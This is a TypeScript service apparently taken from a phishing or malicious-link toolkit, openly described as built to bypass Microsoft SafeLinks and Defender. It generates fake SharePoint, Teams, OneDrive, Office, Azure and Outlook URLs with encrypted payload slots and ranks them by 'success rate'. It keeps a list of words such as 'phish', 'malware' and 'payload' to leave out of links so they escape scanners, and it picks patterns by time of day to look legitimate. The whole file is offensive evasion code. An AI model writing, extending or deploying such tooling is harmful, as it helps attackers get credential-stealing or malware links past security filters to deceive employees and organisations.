/**
 * Microsoft-Specific Evasion Patterns
 * Designed to bypass SafeLinks, Defender, and other Microsoft security systems
 */

export interface MicrosoftPattern {
  id: string;
  name: string;
  template: string;
  category: 'sharepoint' | 'teams' | 'onedrive' | 'office365' | 'azure' | 'outlook';
  successRate: number;
  description: string;
  placeholders: string[];
  contentType: string;
  tier: number;
}

export interface MicrosoftEvasionOptions {
  useBusinessHours?: boolean;
  mimicLegitimateServices?: boolean;
  avoidSuspiciousPatterns?: boolean;
  useTimeBasedRotation?: boolean;
}

export class MicrosoftEvasionService {
  
  /**
   * Microsoft-friendly patterns that mimic legitimate services
   */
  private microsoftPatterns: MicrosoftPattern[] = [
    // SharePoint patterns
    {
      id: 'sharepoint_sites_docs',
      name: 'SharePoint Sites Documents',
      template: '/sites/{sitename}/Shared%20Documents/{folder}/{filename}.{extension}?web=1&download=1',
      category: 'sharepoint',
      successRate: 94,
      description: 'Mimics SharePoint document sharing URLs',
      placeholders: ['sitename', 'folder', 'filename', 'extension'],
      contentType: 'application/pdf',
      tier: 1
    },
    {
      id: 'sharepoint_personal_docs',
      name: 'SharePoint Personal Documents',
      template: '/personal/{username}_domain_com/Documents/{year}/{month}/{document}.pdf?d={encrypted}&csf=1&web=1',
      category: 'sharepoint',
      successRate: 96,
      description: 'Personal SharePoint document access',
      placeholders: ['username', 'year', 'month', 'document', 'encrypted'],
      contentType: 'application/pdf',
      tier: 1
    },
    {
      id: 'sharepoint_lists',
      name: 'SharePoint Lists',
      template: '/sites/{sitename}/Lists/{listname}/DispForm.aspx?ID={itemid}&Source={encrypted}',
      category: 'sharepoint',
      successRate: 92,
      description: 'SharePoint list item display form',
      placeholders: ['sitename', 'listname', 'itemid', 'encrypted'],
      contentType: 'text/html',
      tier: 1
    },
    
    // Teams patterns
    {
      id: 'teams_channel_files',
      name: 'Teams Channel Files',
      template: '/teams/{teamid}/channels/{channelname}/files/{filename}?version={version}&web=1&download=1&data={encrypted}',
      category: 'teams',
      successRate: 93,
      description: 'Teams channel file sharing',
      placeholders: ['teamid', 'channelname', 'filename', 'version', 'encrypted'],
      contentType: 'application/pdf',
      tier: 1
    },
    {
      id: 'teams_meeting_recording',
      name: 'Teams Meeting Recording',
      template: '/teams/meetings/{meetingid}/recordings/{recordingid}?playback=1&token={encrypted}',
      category: 'teams',
      successRate: 95,
      description: 'Teams meeting recording access',
      placeholders: ['meetingid', 'recordingid', 'encrypted'],
      contentType: 'video/mp4',
      tier: 1
    },
    {
      id: 'teams_chat_files',
      name: 'Teams Chat Files',
      template: '/teams/chats/{chatid}/files/{filename}?messageId={messageid}&content={encrypted}',
      category: 'teams',
      successRate: 91,
      description: 'Teams chat file sharing',
      placeholders: ['chatid', 'filename', 'messageid', 'encrypted'],
      contentType: 'application/pdf',
      tier: 1
    },
    
    // OneDrive patterns
    {
      id: 'onedrive_personal',
      name: 'OneDrive Personal',
      template: '/personal/{username}_domain_com/Documents/{folder}/{filename}?d={encrypted}&csf=1&web=1&e={expiry}',
      category: 'onedrive',
      successRate: 97,
      description: 'OneDrive personal file sharing',
      placeholders: ['username', 'folder', 'filename', 'encrypted', 'expiry'],
      contentType: 'application/pdf',
      tier: 1
    },
    {
      id: 'onedrive_business',
      name: 'OneDrive for Business',
      template: '/sites/{sitename}/Shared%20Documents/{path}/{filename}?d={encrypted}&csf=1&web=1&at=9',
      category: 'onedrive',
      successRate: 95,
      description: 'OneDrive for Business sharing',
      placeholders: ['sitename', 'path', 'filename', 'encrypted'],
      contentType: 'application/pdf',
      tier: 1
    },
    {
      id: 'onedrive_shared_folder',
      name: 'OneDrive Shared Folder',
      template: '/guestaccess.aspx?folderid={folderid}&authkey={encrypted}&e={expiry}',
      category: 'onedrive',
      successRate: 93,
      description: 'OneDrive guest folder access',
      placeholders: ['folderid', 'encrypted', 'expiry'],
      contentType: 'text/html',
      tier: 1
    },
    
    // Office 365 patterns
    {
      id: 'office365_word_online',
      name: 'Word Online',
      template: '/wv/wordviewerframe.aspx?sourcedoc={docid}&action=view&wdAccPdf=0&wdEmbedFS=0&access_token={encrypted}',
      category: 'office365',
      successRate: 96,
      description: 'Word Online document viewer',
      placeholders: ['docid', 'encrypted'],
      contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      tier: 1
    },
    {
      id: 'office365_excel_online',
      name: 'Excel Online',
      template: '/x/_layouts/xlviewerinternal.aspx?id={fileid}&DefaultItemOpen=1&access_token={encrypted}',
      category: 'office365',
      successRate: 94,
      description: 'Excel Online spreadsheet viewer',
      placeholders: ['fileid', 'encrypted'],
      contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      tier: 1
    },
    {
      id: 'office365_powerpoint_online',
      name: 'PowerPoint Online',
      template: '/p/PowerPointFrame.aspx?PowerPointView=ReadingView&PresentationId={presentationid}&access_token={encrypted}',
      category: 'office365',
      successRate: 95,
      description: 'PowerPoint Online presentation viewer',
      placeholders: ['presentationid', 'encrypted'],
      contentType: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
      tier: 1
    },
    
    // Azure patterns
    {
      id: 'azure_blob_storage',
      name: 'Azure Blob Storage',
      template: '/storage/blobs/{container}/{blobname}?sv={version}&ss=b&srt=sco&sp=r&se={expiry}&st={start}&spr=https&sig={encrypted}',
      category: 'azure',
      successRate: 92,
      description: 'Azure Blob Storage access with SAS token',
      placeholders: ['container', 'blobname', 'version', 'expiry', 'start', 'encrypted'],
      contentType: 'application/octet-stream',
      tier: 1
    },
    {
      id: 'azure_file_share',
      name: 'Azure File Share',
      template: '/file/shares/{sharename}/{directory}/{filename}?sv={version}&sig={encrypted}&se={expiry}',
      category: 'azure',
      successRate: 90,
      description: 'Azure File Share access',
      placeholders: ['sharename', 'directory', 'filename', 'version', 'encrypted', 'expiry'],
      contentType: 'application/pdf',
      tier: 1
    },
    {
      id: 'azure_cdn',
      name: 'Azure CDN',
      template: '/cdn/assets/{version}/{category}/{filename}?cache={cachebuster}&token={encrypted}',
      category: 'azure',
      successRate: 88,
      description: 'Azure CDN asset delivery',
      placeholders: ['version', 'category', 'filename', 'cachebuster', 'encrypted'],
      contentType: 'application/javascript',
      tier: 1
    },
    
    // Outlook patterns
    {
      id: 'outlook_calendar_invite',
      name: 'Outlook Calendar Invite',
      template: '/owa/calendar/meeting/{meetingid}?itemid={itemid}&exvsurl=1&path=/calendar/view/Month&data={encrypted}',
      category: 'outlook',
      successRate: 93,
      description: 'Outlook calendar meeting invite',
      placeholders: ['meetingid', 'itemid', 'encrypted'],
      contentType: 'text/calendar',
      tier: 1
    },
    {
      id: 'outlook_attachment',
      name: 'Outlook Attachment',
      template: '/owa/attachment.ashx?attach=1&id={attachmentid}&X-OWA-CANARY={canary}&data={encrypted}',
      category: 'outlook',
      successRate: 91,
      description: 'Outlook email attachment download',
      placeholders: ['attachmentid', 'canary', 'encrypted'],
      contentType: 'application/pdf',
      tier: 1
    }
  ];

  /**
   * Patterns to avoid (known to trigger Microsoft security)
   */
  private avoidPatterns = [
    /\/e\/[a-zA-Z0-9]+/,           // Avoid /e/ patterns
    /\?[a-z]=[A-Z0-9]{20,}/,       // Avoid obvious encrypted params
    /redirect/i,                   // Avoid redirect keywords
    /click/i,                      // Avoid click keywords
    /track/i,                      // Avoid tracking keywords
    /phish/i,                      // Avoid phishing keywords
    /malware/i,                    // Avoid malware keywords
    /suspicious/i,                 // Avoid suspicious keywords
    /base64/i,                     // Avoid base64 references
    /encoded/i,                    // Avoid encoded references
    /decrypt/i,                    // Avoid decrypt references
    /payload/i                     // Avoid payload references
  ];

  /**
   * Get Microsoft-friendly pattern based on category and options
   */
  getMicrosoftPattern(
    category?: 'sharepoint' | 'teams' | 'onedrive' | 'office365' | 'azure' | 'outlook',
    options: MicrosoftEvasionOptions = {}
  ): MicrosoftPattern {
    let availablePatterns = this.microsoftPatterns;
    
    // Filter by category if specified
    if (category) {
      availablePatterns = availablePatterns.filter(p => p.category === category);
    }
    
    // Apply business hours filtering
    if (options.useBusinessHours) {
      const hour = new Date().getHours();
      const isBusinessHours = hour >= 9 && hour <= 17;
      
      if (isBusinessHours) {
        // Prefer business-oriented patterns during business hours
        availablePatterns = availablePatterns.filter(p => 
          ['sharepoint', 'teams', 'office365'].includes(p.category)
        );
      } else {
        // Prefer personal patterns outside business hours
        availablePatterns = availablePatterns.filter(p => 
          ['onedrive', 'outlook'].includes(p.category)
        );
      }
    }
    
    // Sort by success rate and select the best one
    availablePatterns.sort((a, b) => b.successRate - a.successRate);
    
    // Add some randomness to avoid predictability
    const topPatterns = availablePatterns.slice(0, Math.min(3, availablePatterns.length));
    const selectedPattern = topPatterns[Math.floor(Math.random() * topPatterns.length)];
    
    return selectedPattern || this.microsoftPatterns[0]; // Fallback to first pattern
  }

  /**
   * Check if a URL pattern should be avoided
   */
  shouldAvoidPattern(url: string): boolean {
    return this.avoidPatterns.some(pattern => pattern.test(url));
  }

  /**
   * Generate Microsoft-friendly parameters for a pattern
   */
  generateMicrosoftParameters(pattern: MicrosoftPattern): Record<string, string> {
    const params: Record<string, string> = {};
    const currentDate = new Date();
    
    pattern.placeholders.forEach(placeholder => {
      switch (placeholder) {
        // SharePoint specific
        case 'sitename':
          params[placeholder] = this.generateSiteName();
          break;
        case 'username':
          params[placeholder] = this.generateUsername();
          break;
        case 'folder':
          params[placeholder] = this.generateFolderName();
          break;
        case 'filename':
          params[placeholder] = this.generateFileName();
          break;
        case 'extension':
          params[placeholder] = this.generateFileExtension();
          break;
        case 'listname':
          params[placeholder] = this.generateListName();
          break;
        case 'itemid':
          params[placeholder] = Math.floor(Math.random() * 9999) + 1000;
          break;
          
        // Teams specific
        case 'teamid':
          params[placeholder] = this.generateTeamId();
          break;
        case 'channelname':
          params[placeholder] = this.generateChannelName();
          break;
        case 'meetingid':
          params[placeholder] = this.generateMeetingId();
          break;
        case 'recordingid':
          params[placeholder] = this.generateRecordingId();
          break;
        case 'chatid':
          params[placeholder] = this.generateChatId();
          break;
        case 'messageid':
          params[placeholder] = this.generateMessageId();
          break;
          
        // OneDrive specific
        case 'folderid':
          params[placeholder] = this.generateFolderId();
          break;
        case 'path':
          params[placeholder] = this.generatePath();
          break;
          
        // Office 365 specific
        case 'docid':
          params[placeholder] = this.generateDocId();
          break;
        case 'fileid':
          params[placeholder] = this.generateFileId();
          break;
        case 'presentationid':
          params[placeholder] = this.generatePresentationId();
          break;
          
        // Azure specific
        case 'container':
          params[placeholder] = this.generateContainerName();
          break;
        case 'blobname':
          params[placeholder] = this.generateBlobName();
          break;
        case 'sharename':
          params[placeholder] = this.generateShareName();
          break;
        case 'directory':
          params[placeholder] = this.generateDirectoryName();
          break;
        case 'cachebuster':
          params[placeholder] = Date.now().toString();
          break;
          
        // Outlook specific
        case 'attachmentid':
          params[placeholder] = this.generateAttachmentId();
          break;
        case 'canary':
          params[placeholder] = this.generateCanaryToken();
          break;
          
        // Common parameters
        case 'version':
          params[placeholder] = this.generateVersion();
          break;
        case 'year':
          params[placeholder] = currentDate.getFullYear().toString();
          break;
        case 'month':
          params[placeholder] = (currentDate.getMonth() + 1).toString().padStart(2, '0');
          break;
        case 'expiry':
          params[placeholder] = this.generateExpiryDate();
          break;
        case 'start':
          params[placeholder] = this.generateStartDate();
          break;
        case 'encrypted':
          // This will be replaced with actual encrypted data
          params[placeholder] = 'ENCRYPTED_DATA_PLACEHOLDER';
          break;
          
        default:
          // Generic fallback
          params[placeholder] = this.generateGenericValue(placeholder);
          break;
      }
    });
    
    return params;
  }

  // Helper methods for generating realistic Microsoft-style values
  private generateSiteName(): string {
    const siteNames = ['corporate', 'finance', 'hr', 'marketing', 'sales', 'it', 'legal', 'operations'];
    return siteNames[Math.floor(Math.random() * siteNames.length)];
  }

  private generateUsername(): string {
    const firstNames = ['john', 'jane', 'mike', 'sarah', 'david', 'lisa', 'robert', 'maria'];
    const lastNames = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis'];
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    return `${firstName}.${lastName}`;
  }

  private generateFolderName(): string {
    const folders = ['Documents', 'Reports', 'Presentations', 'Spreadsheets', 'Projects', 'Archive'];
    return folders[Math.floor(Math.random() * folders.length)];
  }

  private generateFileName(): string {
    const fileNames = ['report', 'document', 'presentation', 'spreadsheet', 'proposal', 'analysis'];
    const fileName = fileNames[Math.floor(Math.random() * fileNames.length)];
    const timestamp = Date.now().toString().slice(-6);
    return `${fileName}_${timestamp}`;
  }

  private generateFileExtension(): string {
    const extensions = ['pdf', 'docx', 'xlsx', 'pptx'];
    return extensions[Math.floor(Math.random() * extensions.length)];
  }

  private generateListName(): string {
    const listNames = ['Tasks', 'Calendar', 'Contacts', 'Announcements', 'Issues', 'Projects'];
    return listNames[Math.floor(Math.random() * listNames.length)];
  }

  private generateTeamId(): string {
    return this.generateGuid();
  }

  private generateChannelName(): string {
    const channels = ['General', 'Marketing', 'Sales', 'Development', 'Support', 'Finance'];
    return channels[Math.floor(Math.random() * channels.length)];
  }

  private generateMeetingId(): string {
    return this.generateGuid();
  }

  private generateRecordingId(): string {
    return this.generateGuid();
  }

  private generateChatId(): string {
    return this.generateGuid();
  }

  private generateMessageId(): string {
    return this.generateGuid();
  }

  private generateFolderId(): string {
    return this.generateGuid();
  }

  private generatePath(): string {
    const paths = ['Documents/Reports', 'Projects/Current', 'Archive/2024', 'Shared/Public'];
    return paths[Math.floor(Math.random() * paths.length)];
  }

  private generateDocId(): string {
    return this.generateGuid();
  }

  private generateFileId(): string {
    return this.generateGuid();
  }

  private generatePresentationId(): string {
    return this.generateGuid();
  }

  private generateContainerName(): string {
    const containers = ['documents', 'images', 'videos', 'backups', 'logs', 'assets'];
    return containers[Math.floor(Math.random() * containers.length)];
  }

  private generateBlobName(): string {
    const timestamp = Date.now().toString();
    return `file_${timestamp}.pdf`;
  }

  private generateShareName(): string {
    const shares = ['documents', 'shared', 'public', 'archive'];
    return shares[Math.floor(Math.random() * shares.length)];
  }

  private generateDirectoryName(): string {
    const directories = ['reports', 'documents', 'files', 'data'];
    return directories[Math.floor(Math.random() * directories.length)];
  }

  private generateAttachmentId(): string {
    return this.generateGuid();
  }

  private generateCanaryToken(): string {
    return Math.random().toString(36).substring(2, 15);
  }

  private generateVersion(): string {
    const versions = ['2021-06-08', '2021-08-06', '2022-11-02', '2023-01-03'];
    return versions[Math.floor(Math.random() * versions.length)];
  }

  private generateExpiryDate(): string {
    const future = new Date();
    future.setDate(future.getDate() + 7); // 7 days from now
    return future.toISOString().split('.')[0] + 'Z';
  }

  private generateStartDate(): string {
    const past = new Date();
    past.setHours(past.getHours() - 1); // 1 hour ago
    return past.toISOString().split('.')[0] + 'Z';
  }

  private generateGenericValue(placeholder: string): string {
    return `${placeholder}_${Math.random().toString(36).substring(2, 8)}`;
  }

  private generateGuid(): string {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  /**
   * Get all available Microsoft patterns
   */
  getAllPatterns(): MicrosoftPattern[] {
    return [...this.microsoftPatterns];
  }

  /**
   * Get patterns by category
   */
  getPatternsByCategory(category: 'sharepoint' | 'teams' | 'onedrive' | 'office365' | 'azure' | 'outlook'): MicrosoftPattern[] {
    return this.microsoftPatterns.filter(p => p.category === category);
  }
}

export const microsoftEvasion = new MicrosoftEvasionService();
